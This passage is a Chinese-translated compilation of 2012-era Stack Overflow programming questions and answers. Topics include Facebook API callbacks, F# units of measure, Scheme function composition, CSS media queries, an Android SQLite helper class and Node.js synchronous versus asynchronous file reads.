还有我在html中的表格：

```
 <form method="POST" name="register" action="" onsubmit="return false">
      <table id="register">

      <tr>
      <td style="padding-bottom:30px; padding-right:20px;"><span style=" font-size:14px; color:#666;">Korisnicko Ime:</span></td>           
      <td><input id="user" type="text" name="username" /></td>                   
      </tr>

      <tr>
      <td style="padding-bottom:30px; padding-right:20px;"><span style=" font-size:14px; color:#666;">Sifra:</span></td>            
      <td> <input id="pass" type="password" name="password" /></td>           
      </tr>

      <tr>
      <td style="padding-bottom:30px; padding-right:20px;"><span style=" font-size:14px; color:#666;">Ponovite Sifru:</span></td>            
      <td> <input id="pass2" type="password" name="password" /></td>           
      </tr>

      <tr>
      <td style="padding-bottom:30px;"><span style=" font-size:14px; color:#666;">Email:</span></td>            
      <td><input id="email" type="text" name="email" /> <input type="hidden" name="form_submitted" value="1"/></td>           
      </tr>

      <tr>                  
      <td style="padding-bottom:30px;" colspan="2" align="center"><input id="prijava" type="submit" value="Prijavi" /></td>           
      </tr>

      <tr>                  
      <td id="errorCol" colspan="2" align="center"></td>           
      </tr>

      </table>
      </form> 
```

所以它将数据插入数据库，但是我需要将响应显示到 id 为“errorCol”的元素中的部分不起作用，它只是保持为空。试图返回 json 数组。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T14:47:18.130

您的代码中有几个拼写错误。

1.  php测试看表单是否提交( `$_POST['form_submitted'] = 1`)是赋值，应该是双==，否则永远为真。

2.  在您的 jquery 中，“成功”回调拼写错误，您有“成功”

# javascript - 使用回调在 fb.api 之外获取值变量

> ID：13822055
> 
> 赞同：6
> 
> 时间：2012-12-11T14:40:43.670
> 
> 标签：javascript, facebook, api

我知道ajax和返回变量的问题，我在stackoverflow中读到了这个，我知道我必须使用回调函数，但在我的情况下没有工作，当然我做错了

我的代码是这样的：

```
var id_user=get_id_user_login();//undefined??????????

function get_id_user_login(){
    FB.api(                                                
         '/me',                     
          {fields:'id'},
          function(response){//callback       
                 console.log(response.id);//OK
                 return response.id;
           }
     );             
}; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-11T15:11:48.170

您不能只返回值，因为它是异步的。尝试这个：

```
function customFunction(id) {
    console.log(id);
}

function get_id_user_login(){
    FB.api(                                                
         '/me',                     
          {fields:'id'},
          function(response){   
                 customFunction(response.id);
           }
     );             
};

get_id_user_login(); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-08-11T14:31:58.973

完美，这是可以正常工作的示例：

```
function mostrarInvitaciones(){
FB.login(function(response)
{   
    var object = { method: 'apprequests', 
          message: 'Message Txt',
          filters: ['app_non_users'],
          max_recipients: '1',
          redirect_uri: 'here the url app'
    };
    // Function callback for get the values, because the Fb.api is async.
    function callback(response){
            function obtenerDatosLoginUsuario(id, name) {
                //console.log('Id Usuario desde custom: '+id);
                //console.log('Nombre usuario desde custom: '+name);
                document.getElementById('miid').innerHTML = id;
                document.getElementById('minombre').innerHTML = name;
            }
            function obtenerDatosAmigo(id, name) {
                //console.log('Id Amigo desde custom: '+id);
                //console.log('Nombre Amigo desde custom: '+name);
                document.getElementById('idamigo').innerHTML = id;
                document.getElementById('nombreamigo').innerHTML = name;
            }
            // Datos del Login Usuario
            function datosLoginUsuario(){
                FB.api('/me',{fields: 'name'}, function(response)
                {
                    //console.log(response.name);
                    //console.log(response);
                    obtenerDatosLoginUsuario(response.id,response.name);
                });
            }
            // Datos del amigo seleccionado
            function datosAmigoInvitado(){
                FB.api('/'+ response.to, function(response)
                {
                    //console.log(response.id);
                    //console.log(response.name);
                    obtenerDatosAmigo(response.id,response.name);
                });
            }
            // Call the function
            datosLoginUsuario();
            datosAmigoInvitado();

    };      
    // Facebook UI
    FB.ui(object, callback)

}) 
```

}

# c# - 使用 js 和 mvc 裁剪图像

> ID：13822059
> 
> 赞同：0
> 
> 时间：2012-12-11T14:40:58.840
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3

我正在使用 MVC3 通过网络表单发送图像集合。控制器接收此发布的图像并将其名称保存到数据库中。

```
[HttpPost]
public ActionResult Edit(MyViewModel data, IEnumerable<HttpPostedFileBase> postedImages)
{
   if (ModelState.IsValid)
   {
      using (session...and transaction...)
      {
         MyModel model = session.Get<MyModel>(data.Id);                           
         data.SendToDomainModel(model, session);                     
         foreach (var image in postedImages)
         {
            if ((image != null) && (image.ContentLength > 0))
            {
                Photo photo = new Photo();
                var fileName = Path.GetFileName(image.FileName);
                // path used to save actuall image to the hdd path
                var pathToSave = Path.Combine(Server.MapPath("~/Content/uploads"), fileName);
                // path used to save image path inside db column
                var path = Path.Combine("/Content/uploads/" + fileName);
                photo.MyModel= session.Load<MyModel>(model.Id);
                photo.Path = path;
                photo.Name = fileName;
                image.SaveAs(pathToSave);
                model.Photos.Add(photo);
              }
           }
           // commit transaction ..
           // save session ..
       }
       return RedirectToAction("Index");
    }
    else { return View(data); }
} 
```

如何使用图像集合中的第一张图像并使用文件名前缀“firstImage”复制它并裁剪为 50x50px 尺寸？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:25:22.550

使用 System.Drawing 可以实现简单的、非优化的调整大小[`GetThumbnailImage`](http://msdn.microsoft.com/en-us/library/system.drawing.image.getthumbnailimage.aspx)

例子：

```
Image thumb=image.GetThumbnailImage(50, 50, null, IntPtr.Zero); 
```

对于没有[此处列出的陷阱](http://www.nathanaeljones.com/blog/2009/20-image-resizing-pitfalls)的更优化的方法，请参阅：

[这个答案](https://stackoverflow.com/questions/662080/how-to-efficiently-scale-and-crop-images-in-an-asp-net-app#answer-8163392)

# windows-phone-8 - Windows phone 8 模拟器不显示地图

> ID：13822061
> 
> 赞同：1
> 
> 时间：2012-12-11T14:40:34.153
> 
> 标签：windows-phone-8, windows-phone-8-emulator

我正在尝试创建一个 windows phone 8 应用程序，但模拟器没有向我显示地图。我得到的就是这个。

![没有地图土地](../Images/23cafedef530528b609392baae09415a.png) 如您所见，没有显示土地质量，也没有显示道路。我四处移动并没有发现任何东西，并且模拟器位置设置为应该显示土地的区域。

如果我在我的设备上运行它，它可以正常工作并加载地图。

这可能是由于端口阻塞问题或类似的愚蠢问题。

干杯马克

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-26T21:36:52.087

批准的答案可能不是 100% 正确的。查看以下博客文章，您会注意到，您的模拟器可能无法访问互联网。 [http://michalstawarz.pl/2013/01/26/windows-phone-8-emulator-maps-display/](http://michalstawarz.pl/2013/01/26/windows-phone-8-emulator-maps-display/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-12-06T08:44:22.873

**Windows Phone 模拟器肯定支持 Bing 地图。**

看来问题可能是由于

1.  主机 PC 的网络连接问题
2.  代理问题
3.  其他问题

**上述问题的解决方法。**

如果您看到 迈克尔提到 的[http://michalstawarz.pl/2013/01/26/windows-phone-8-emulator-maps-display/中的空白蓝色地图屏幕。](http://michalstawarz.pl/2013/01/26/windows-phone-8-emulator-maps-display/)

然后它很好去。问题是未配置 Internet 连接/代理。

**如果它是网络连接，**则对系统网络适配器进行故障排除。问题可能是由于网络连接受限/PC 未连接到 Internet。

**如果是代理的**话，

1.  在 CMD 提示符下使用 IPCONFIG 获取“Internal Ethernet Port Windows Phone Emulator Internal Switch”的 IP 地址
2.  然后在IE的局域网设置>>高级>>异常中的异常列表下输入

**其他问题**可能是由于手动更改适配器的 IP 设置时未配置/不正确的 IP 配置。

如果是这种情况 - 然后使用 Hyper-V 管理器中的虚拟交换机管理器菜单删除所有虚拟适配器，并使用管理员权限运行模拟器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T00:16:09.310

~~Windows Phone 8 模拟器不支持地图。~~

现在支持地图，原来的问题不再有效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-03T12:02:02.997

如果 Micheal 和 Prakash 的答案不能解决您的问题。那么试试这个 -

1.  打开*C:\Windows*文件夹中的 regedit。

2.  在注册表编辑器中打开

    对于 64 位 Windows-

    HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\InternetExplorer\MAIN\FeatureControl\FEATURE_BROWSER_EMULATION，然后使用十六进制值 2328 创建 XDETools.exe。

    对于 64 位 Windows-

    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\InternetExplorer\MAIN\FeatureControl\FEATURE_BROWSER_EMULATION，然后使用十六进制值 2328 创建 XDETools.exe。

**来源**- [http://igrali.com/2012/07/30/windows-phone-location-tool-in-emulator-down-no-problem/](http://igrali.com/2012/07/30/windows-phone-location-tool-in-emulator-down-no-problem/)

# c# - 实体框架 - 采取什么方法来保存数据

> ID：13822063
> 
> 赞同：0
> 
> 时间：2012-12-11T14:40:49.893
> 
> 标签：c#, entity-framework, .net-4.0, dbcontext

我正在使用带有代码优先方法的最新 EF5。我的存储库是一个非静态类。问题 - 如果我想正确更新数据，我可以采取以下两种方法之一：

1.  创建 Repository 的一个实例并将它扔到我的应用程序中。
2.  保存时执行以下操作：

例子：

```
var foo = myDbContext.MyObjects
              .First(object => object.Id = idOfObjectIWantToSave)

foo.PropertyToUpdate = newValue;
ctx.SaveChanges(); 
```

最好的方法是什么？也可以为 DAL 创建一个静态类，但我已经阅读 [on stackoverflow] 这不是一个好主意。

# c# - 在内容文件夹中添加新文件在 NuGet 中不起作用

> ID：13822065
> 
> 赞同：1
> 
> 时间：2012-12-11T14:41:16.330
> 
> 标签：c#, nuget

我使用 NuGet C# 项目创建了一个包，其中包含一些 aspx/aspx.cs 文件的内容文件夹内的文件夹（例如 Pages），这些文件实际上是另一个项目的一部分，当我更新文件时一切正常（即当我安装/更新它也在更新的软件包）。

但我有一个要求：如果我在`Search.aspx`Visual Studio 的同一个文件夹（即 Pages）中添加一个新的 aspx 页面，我已经添加到内容文件夹中的内容也应该添加到内容文件夹中，这不会发生。

那么，有没有办法在内容文件夹中自动更新新添加的文件？

最后，我想提一下，我想在 NuGet Explorer 中做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T07:27:22.463

您可能希望在 nuspec 文件中[为包内容指定整个文件夹。](http://docs.nuget.org/docs/release-notes/nuget-2.2)Nuget.org 网站有一个示例，但简而言之，您可以将其添加到 nuspec：

```
<file src="scripts\" target="content\scripts"/> 
```

# f# - 使用 F# 测量单位从 m/s 转换为 km/h

> ID：13822066
> 
> 赞同：8
> 
> 时间：2012-12-11T14:39:58.143
> 
> 标签：f#, units-of-measurement

我正在学习 F# - 目前正在研究计量单位。我有一个返回米每秒的简单计算，我想介绍一个将其转换为每小时公里数的函数。

我的代码如下所示：

```
[<Measure>] type kg
[<Measure>] type s
[<Measure>] type m
[<Measure>] type km
[<Measure>] type h            

let msToKmph(speed : float<m/s>) =
    (float speed) * 3.6<km/h>

let gravityOnEarth = 9.81<m/s^2>
let heightOfJump = 3.5<m>

let speedOfImpact = sqrt (2.0 * gravityOnEarth * heightOfJump)
let speedOfImpactKmh = msToKmph(speedOfImpact) 
```

这行得通 - 我得到 8.28673639 m/s 和 29.832251 km/h。我不确定这是否是表达不同单位之间关系的最佳方式。这可以更优雅地完成吗？

例如，行（浮动速度）从速度参数中删除单位信息，使 msToKmph 返回 km/h。如果我在计算之前没有删除单位信息，则返回的单位为：km m/(hs)

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-11T15:01:25.070

首先，你`msToKmph`是完全不正确的。虽然它返回一个正确的返回值，但它实际上在做什么，它只是通过转换为一个普通的、*无量*度的，然后将*无量*度的值乘以 a 来**降低**原始值。`<m/s>` *`float`*`3.6<km/h>`**

 **为了更好地表达计量单位之间的关系，请考虑以下内容：

```
let kmToM = 1000.0<m/km>  // relation between kilometers and meters
let hrToSec = 3600.0<s/h> // relation between seconds and hours
let msToKmph(speed : float<m/s>) =
    speed / kmToM * hrToSec 
```

请注意，所有“幻数”都封装在 UoM 转换器中，因此您的公式保持干净，例如它们只是操作值和常量，但 UoM 是由编译器计算的。

**更新：**计量单位转换的理念是转换公式应该是**具有物理意义的东西**。经验法则是您的转化价值是否出现在参考书中。用简单的英语来说，`3.6<km/h>`从上面看是没有用的，`1000.0<m/km>`只是说“1公里有1000米”，这是有道理的。

你甚至可以`hrToSec`像这样改进：

```
let hrToSec2 = 60.0<s/minute> * 60.0<minute/h> 
```

这将使每个值都成为参考书中的众所周知的值。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-11T15:02:06.827

你说得对，删除单位信息是一件坏事。您应该创建一些具有适当单位的常量以进行转换。

```
let mPerKm = 1000.0<m/km>
let secondPerHour = 3600.0<s/h>

// val msToKmph : float<m/s> -> float<km/h>
let msToKmph(speed : float<m/s>) =
    speed / mPerKm * secondPerHour 
```

对于`km`和`m`，一个通用的解决方案是定义一个单位前缀`k`，以便它适用于许多以千为度量的计量单位：

```
[<Measure>] type k

let kilo = 1000.0<1/k>
let secondPerHour = 3600.0<s/h>

// val msToKmph : float<m/s> -> float<k m/h>
let msToKmph(speed : float<m/s>) =
    speed / kilo * secondPerHour 
```**

# if-statement - 不是程序，真的吗？

> ID：13822071
> 
> 赞同：1
> 
> 时间：2012-12-11T14:41:27.723
> 
> 标签：if-statement, scheme

我已经尝试了 2 个小时来解决这个问题！请考虑以下代码：

```
(define (PowListF list) 
  (PowListFHelp list (- (length list) 1)))

(define (FuncPow f n) 
  (if (= 0 n)
      f
      (lambda (x)
        (FuncPow (f (- n 1)) x))))

(define (PowListFHelp list n) 
  (if (= n 0)
      (list (list-ref list 0))
      (cons (FuncPow (list-ref list n) n)
            (PowListFHelp list (- n 1))))) 
```

火箭计划编译器给我错误：应用程序：不是程序；期望一个可以应用于给定参数的过程：(# #) arguments...: #

它指向（缺点部分......

并且以下使用相同 if 结构的代码确实有效：

```
(define (polyCheb n)
  (reverse (polyChebHelp n)))

(define (polyChebHelp n)
  (if (= n 0)
      (list (polyChebFunc n))
      (cons (polyChebFunc n)
            (polyChebHelp (- n 1)))))

(define (polyChebFunc n)
  (if (= n 0)
      (lambda (x) 1)
      (if (= n 1) 
          (lambda (x) x)     
          (lambda (x)
            (- (* (* 2 x)
                  ((polyChebFunc(- n 1)) x))
               ((polyChebFunc(- n 2)) x)))))) 
```

编辑： PowListF 被赋予函数列表作为参数，返回相同的列表 st 每个函数都由自身（其索引 + 1）次组成......

用法： ((list-ref (PowListF (list (lambda (x) x) (lambda (x) (expt x 2)))) 1) 2) 值应该是 2^2^2=2^4=16

编辑2：

这是解决方案：

```
(define (FuncPow f n) 
  (if (= 0 n)
      f
      (lambda (x) (f ((FuncPow f (- n 1)) x))))) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:45:01.797

问题在于：`(FuncPow(f (- n 1)) x)`

调用的结果`f`必须是过程（我假设这是你返回一个过程）。

然后您进一步“分配”`f`为：`(list-ref list n)`。

# objective-c - iOS 6 AppStore 应用列表 UIScrollView 行为

> ID：13822072
> 
> 赞同：1
> 
> 时间：2012-12-11T14:41:28.453
> 
> 标签：objective-c, ios, uiscrollview

有谁知道如何在 iOS 6 AppStore 应用列表中实现滚动视图的行为？特别是 3,5 个图标的分页（右侧图标的一半），以及列表结束时 - 左侧图标的一半。

到目前为止尝试过： 1\. 自定义手势识别器（看起来有点 hacky + 代码中有很多数学运算） 2\. 滚动视图及其子视图（插图、框架、内容大小等）的不同配置，但它仍然无法正常工作预期的

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:06:09.180

我不能 100% 确定 App Store 应用程序是否实际使用`UIScrollView`- 它曾经主要是基于 HTML 的。

无论如何，您应该能够使用`scrollViewWillEndDragging:withVelocity:targetContentOffset:`iOS 5 中引入的相对较新的委托方法。此方法旨在让您在用户抬起手指时将滚动视图移动到自定义位置，而无需担心减速/速度（即，自定义分页偏移量）。您需要确保将滚动视图设置为不分页以触发此委托方法。

一旦触发（当用户将手指从屏幕上抬起时），您就可以计算所需的内容偏移量并设置传入的`targetContentOffset`属性。然后滚动视图将自动减速到您提供的适当内容偏移量。

# c# - 动态生成的表行永远不会更新

> ID：13822078
> 
> 赞同：0
> 
> 时间：2012-12-11T14:40:20.220
> 
> 标签：c#, asp.net

我有一个 ASP.NET 表，用于创建表单的动态部分（用户可以无限制地添加多个项目）。该表在具有第一行的页面的标记中定义。

代码大致如下：

```
TableRow row = new TableRow();
TableCell tc = new TableCell();
tc.Controls.Add(new TextBox());
row.Cells.Add(tc);
myTable.Rows.Add(row);
myTable.DataBind(); 
```

当我添加第一行时这很好用，但是当我添加后续行时，它们永远不会被添加。就像表格在第一次添加时停止，我无法弄清楚我做错了什么。

# css - 当分辨率发生变化时，如何设置div的宽度以占据整个空间？

> ID：13822082
> 
> 赞同：0
> 
> 时间：2012-12-11T14:42:26.733
> 
> 标签：css

我正在使用 WordPress 和我购买的模板来构建我遇到问题的网站。该模板是为了响应而构建的，我面临一些问题，无论我尝试了什么，我都无法找到解决它们的方法。

有两个框在重新调整窗口大小时不会占据所有可用宽度。

这是`php`代码：

```
<div class="gb_ff social_share bold font_x_small boxed2">
                     <span class="meta_title_social">
                           <?php gb_e('Share') ?>
                     </span>
                    <?php get_template_part('inc/social-share') ?>
                </div>

            <div class="gift boxed3">
                 <span class="gift_image">
                        <img src="http://topgreekgyms.fitnessforum.gr/wp-content/uploads/2012/12/gift.png";?>
                 </span>

                 <span class="gift_title">
                        <a href="<?php gb_add_to_cart_url(); ?>" class=""><?php gb_e('Buy for friend') ?></a>
                  </span>
            </div> 
```

这是CSS

```
.gb_ff, h1, h2, h3, h4, h5 {
font-family: Arial;
color: #666666;
text-transform: none;
}

.social_share {
    width: auto;
    float: left;
    padding: 9px 0 0 0;
    }

.boxed2 {
    width: 300px;
    height: 65px;
    background-color: #f9f9f9;
    margin-top: 15px;
    border-radius: 5px;
    -moz-border-radius: 5px;
    background-image: url(http://topgreekgyms.fitnessforum.gr/wp-content/themes/blank-child-theme/img/gradient.png);
    background-repeat: repeat-x;
    background-position: center bottom;
    border-bottom: 1px solid #CCC;
    border-bottom: 1px solid rgba(0, 0, 0, .1);
    box-shadow: 0 1px 1px #7D7D7D;
    }

.gift{
    font-size: 0.6em;
    font-family: Arial;
    float:left;
    }

.boxed3 {
    width: 297px;
    height:65px;
    background-color: #f9f9f9;
    margin-top: 15px;
    border-radius: 5px;
    -moz-border-radius: 5px;
    background-image: url(http://topgreekgyms.fitnessforum.gr/wp-content/themes/blank-child-theme/img/gradient.png);
    background-repeat: repeat-x;
    background-position: center bottom;
    border-bottom: 1px solid #CCC;
    border-bottom: 1px solid rgba(0, 0, 0, .1);
    box-shadow: 0 1px 1px #7D7D7D;
    }

.gift_image {
    float: left;
    margin: 16px 9px;
    }

.gift_title {
    color: #666;
    font-size: 15px;
    font-family: arial;
    font-weight: bold;
    margin-left: 3px;
    margin-top: 10px;
    line-height: 66px;
    } 
```

我所指的框是出现在倒计时下方的框。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:53:40.520

我不知道您的 css 是如何组织的，但是这些行应该可以做到（假设它足够[具体）：](http://coding.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/)

```
@media all and (max-width: 900px) { /* this media query rule is probably
                                       in the css already. no need to repeat it*/
   .boxed2,
   .boxed3 {
       width: 100%;
   }
} 
```

如果这是您第一次看到/听到媒体查询，那么[这](http://css-tricks.com/css-media-queries/)可能很有用：[CSS 媒体查询和使用可用空间](http://css-tricks.com/css-media-queries/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T14:50:47.157

在您想要的媒体查询中，当分辨率为特定大小时，CSS 将这些元素的宽度设置为 width:100%。

媒体查询已经存在 - 您只需在其中为这些元素添加一个 css 规则。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:00:23.783

CSS 媒体查询用于为所需的屏幕/窗口分辨率应用某些样式。例如，您的主题中的所有媒体查询都可以在 style-media-queries.css 文件中找到。

将此添加到您的CSS

```
@media (max-width: 900px) {
   #boxed2, #boxed3{
     width:auto;
     float:none;
   }

} 
```

[您可以在此处](http://webdesignerwall.com/tutorials/responsive-design-with-css3-media-queries)阅读有关媒体查询的更多信息

# android - 将 SQLiteHelper 与另一个源文件连接

> ID：13822084
> 
> 赞同：0
> 
> 时间：2012-12-11T14:42:33.993
> 
> 标签：android, sqlite

我有一个 SQLiteHelper 源文件，用于创建数据库、数据等。我有另一个源文件需要获取 SQLiteHelper 源文件创建的数据。我怎样才能做到这一点？更具体地说，如何连接两个源文件？如果没有我将 GetReadableDatabase() 指向由 SQLiteHelper 创建的数据库（我如何将其指向数据库？），就无法使用 GetReadableDatabase()。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T14:55:39.653

在您的 SQLiteOpenHelper 类中实现标准的 CRUD 操作，然后在您的活动中实例化您的 SQLite Helper（使用单个静态实例可能会更好）。通过该实例访问您的数据库。

这是我不久前在 Facebook 聊天应用程序中使用的 Helper 类的片段。

```
/**
 * @author vinaysshenoy
 * Manages all database aspects
 */
public class MyDatabaseHelper extends SQLiteOpenHelper {

        //Database properties
        public static final String DATABASE_NAME = "database.db";
        public static final int DATABASE_VERSION = 1;

        //Database Table Names
        public static final String TABLE_FRIENDS = "Friends";
        public static final String TABLE_CONVERSATIONS = "Conversations";

        //Friends Table Columns
        public static final String FRIENDS_COLUMN_FB_USER_ID = "fb_user_id";
        public static final String FRIENDS_COLUMN_FB_USERNAME = "fb_username";
        public static final String FRIENDS_COLUMN_FB_FULL_NAME = "fb_full_name";

        //Conversations Table Columns
        public static final String CONVERSATIONS_COLUMN_ID = "_id";
        public static final String CONVERSATIONS_COLUMN_USER_ID = "user_id";
        public static final String CONVERSATIONS_COLUMN_FRIEND_ID = "friend_id";
        public static final String CONVERSATIONS_COLUMN_ENDED = "ended";

        //Database Creation SQL
        static final String CREATE_TABLE_FRIENDS = "CREATE TABLE "
                        + TABLE_FRIENDS + "("
                        + FRIENDS_COLUMN_FB_USER_ID + " integer primary key,"
                        + FRIENDS_COLUMN_FB_USERNAME + " text not null unique,"
                        + FRIENDS_COLUMN_FB_FULL_NAME + " text not null"
                        + ");";

        public static final String CREATE_TABLE_CONVERSATIONS = "CREATE TABLE "
                        + TABLE_CONVERSATIONS + "("
                        + CONVERSATIONS_COLUMN_ID + " integer primary key autoincrement,"
                        + CONVERSATIONS_COLUMN_USER_ID + " integer not null,"
                        + CONVERSATIONS_COLUMN_FRIEND_ID + " integer not null,"
                        + CONVERSATIONS_COLUMN_ENDED + " integer not null"
                        + ");";

        public MyDatabaseHelper(Context context, String name, CursorFactory factory, int version) {
                super(context, name, factory, version);
        }

        @Override
        public void onCreate(SQLiteDatabase db) {
                createFriendsTable(db);
                createConversationsTable(db);
        }

       private void createConversationsTable(SQLiteDatabase db) {
                db.execSQL(CREATE_TABLE_CONVERSATIONS);
        }

        private void createFriendsTable(SQLiteDatabase db) {
                db.execSQL(CREATE_TABLE_FRIENDS);
        }

         /**
         * @param table Name of the table to query
         * @param columns Array of column names to fetch
         * @param selection WHERE clause
         * @param selectionArgs WHERE clause arguments
         * @param groupBy GROUP BY clause
         * @param having HAVING clause
         * @param orderBy ORDER BY clause
         * @return Cursor to the requested rows
         */
        public Cursor getCursor(String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy) {

                return getReadableDatabase().query(table, columns, selection, selectionArgs, groupBy, having, orderBy);
        }

        /**
         * Insert or replace a single row into a table
         * @param table Name of the table
         * @param nullColumnHack null hack
         * @param values Values to insert
         */
        public void putData(String table, String nullColumnHack, ContentValues values) {

                SQLiteDatabase db = getWritableDatabase();
                db.replace(table, nullColumnHack, values);
                db.close();
        }

        /**
         * Insert or replace an array of rows into a table
         * @param table Name of the table
         * @param nullColumnHack null hack
         * @param values Array of values to insert
         */
        public void putData(String table, String nullColumnHack, ContentValues[] values) {

                SQLiteDatabase db = getWritableDatabase();
                try {
                        db.beginTransaction();
                        for(ContentValues value : values) {
                                db.replace(table, nullColumnHack, value);
                        }
                        db.setTransactionSuccessful();
                }
                catch(Exception e) {
                        e.printStackTrace();
                }
                finally {
                        db.endTransaction();
                }

                db.close();
        }

        /**
         * Delete rows from a table
         * @param table Name of the table
         * @param whereClause WHERE clause
         * @param whereArgs WHERE clause arguments
         */
        public void deleteData(String table, String whereClause, String[] whereArgs) {

                SQLiteDatabase db = getWritableDatabase();
                db.delete(table, whereClause, whereArgs);
                db.close();
        }

        /**
         * Update a table
         * @param table Name of the table
         * @param values Values to update
         * @param whereClause WHERE clause
         * @param whereArgs WHERE clause arguments
         */
        public void updateData(String table, ContentValues values, String whereClause, String[] whereArgs) {

                SQLiteDatabase db = getWritableDatabase();
                db.update(table, values, whereClause, whereArgs);
                db.close();
        }

} 
```

然后在你的活动中，做`MyDatabaseHelper dbHelper = new MyDatabaseHelper()`，然后你定义你调用时需要的投影和选择`dbHelper.getCuror()`，或者其他方法。

这段代码是我刚开始编程时编写的，所以从结构 POV 来看，它写得非常糟糕（至少，我现在是这样认为的），但这就是它的工作方式。

编辑：初始化你的数据库助手

```
databaseHelper = new MyDatabaseHelper(
                                        HomeActivity.this,
                                        MyDatabaseHelper.DATABASE_NAME, null,
                                        MyDatabaseHelper.DATABASE_VERSION); 
```

# node.js - fs.readFileSync 似乎比 fs.readFile 快 - 可以用于生产中的 Web 应用程序吗？

> ID：13822085
> 
> 赞同：44
> 
> 时间：2012-12-11T14:42:37.280
> 
> 标签：node.js, localization, io

我知道在 node 中开发时，您应该始终尽量避免阻塞（同步）函数并使用异步函数，但是我进行了一些测试以查看它们的比较。

我需要打开一个包含 i18n 数据（如日期和时间格式等）的 json 文件，并将该数据传递给一个类，该类使用该数据在我的视图中格式化数字等。

开始将所有类的方法包装在回调中会有点尴尬，所以如果可能的话，我会改用同步版本。

```
console.time('one');
console.time('two');
fs.readFile( this.dir + "/" + locale + ".json", function (err, data) {
  if (err) cb( err );
  console.timeEnd('one');
});
var data = fs.readFileSync( this.dir + "/" + locale + ".json" );
console.timeEnd('two'); 
```

这会在我的控制台中产生以下几行：

```
two: 1ms
one: 159ms 
```

似乎 fs.readFileSync 比 fs.readFile 快大约 150 倍，加载一个 50KB 的 json 文件（缩小）大约需要 1 毫秒。我所有的 json 文件都在 50-100KB 左右。

我还在想也许以某种方式将这个 json 数据存储或保存到会话中，以便每个会话（或当用户更改其语言环境时）只读取一次文件。我不完全确定如何做到这一点，这只是一个想法。

可以`fs.readFileSync`在我的情况下使用还是我以后会遇到麻烦？

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2012-12-11T15:42:36.590

不，正如您所描述的那样，在节点服务器中使用阻塞 API 调用是不行的。您的站点对许多并发连接的响应将受到巨大影响。这也公然违反了 node.js 的#1 原则。

节点工作的关键在于，它在等待 IO 的同时，也在进行 CPU/内存处理。这需要专门的异步调用。因此，如果您有 100 个客户端读取 100 个 JSON 文件，节点可以要求操作系统读取这 100 个文件，但在等待操作系统返回可用的文件数据时，节点可以处理这 100 个网络请求的其他方面。如果您在那里有一个同步调用，那么在该操作完成时，您的所有客户端处理都会完全停止。因此，当您按顺序读取客户端 1、2、3、4 等的文件时，客户端 100 的连接会等待而不会进行任何处理。这是法尔维尔。

这是另一个类比。如果您去一家餐馆并且是唯一的顾客，那么如果一个人坐在您旁边，接您的订单，烹饪，为您服务并处理账单，您可能会获得更快的服务，而无需与主机打交道的协调开销/女主人、服务员、主厨、排队厨师、收银员等。然而，餐厅有 100 位顾客，额外的协调意味着事情会并行发生，餐厅的整体响应能力将大大提高，远远超过一个人的情况。试图自己处理 100 个客户。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-12-11T15:18:17.897

您正在用同步读取阻塞异步读取的回调，记住**单线程**。现在我知道时间差仍然是惊人的，但你应该尝试使用一个阅读时间长得多的文件，并想象很多很多客户都会这样做，只有这样开销才会得到回报。那应该回答您的问题，是的，如果您使用阻塞 IO 服务数千个请求，您将遇到麻烦。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-08-01T08:03:15.223

是的，没错，就是在服务端环境中处理异步的方式。但是如果他们的用例不同，比如在客户端 JS 项目中生成构建，同时读写不同风格的 JSON 文件。

影响不大。尽管我们需要一种快速的方式来创建用于部署的缩小构建（这里同步出现）。 [了解更多信息和图书馆](https://www.npmjs.com/package/fs-extra)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-10-06T16:54:35.680

经过大量时间和大量学习和练习后，我再次尝试并找到了答案，我可以举一些例子：

```
const fs = require('fs');

const syncTest = () => {
    let startTime = +new Date();
    const results = [];
    const files = [];

    for (let i=0, len=4; i<len; i++) {
        files.push(fs.readFileSync(`file-${i}.txt`));
    };

    for (let i=0, len=360; i<len; i++) results.push(Math.sin(i), Math.cos(i));
    console.log(`Sync version: ${+new Date() - startTime}`);
};

const asyncTest = () => {
    let startTime = +new Date();
    const results = [];
    const files = [];

    for (let i=0, len=4; i<len; i++) {
        fs.readFile(`file-${i}.txt`, file => files.push(file));
    };

    for (let i=0, len=360; i<len; i++) results.push(Math.sin(i), Math.cos(i));

    console.log(`Async version: ${+new Date() - startTime}`);
};

syncTest();
asyncTest(); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2017-10-26T14:23:50.103

我试图检查 fs.readFileSync() 和 fs.readFile() 之间的真实、可测量的速度差异，用于下载 SD 卡上的 3 个不同文件，我在下载之间添加了一些数学计算，但我没有'不明白速度差异在哪里，当节点速度更快时，节点图片上总是显示的速度差异也在简单的操作中，例如下载 3 次相同的文件，并且此操作的时间接近下载 1 次此文件所需的时间.

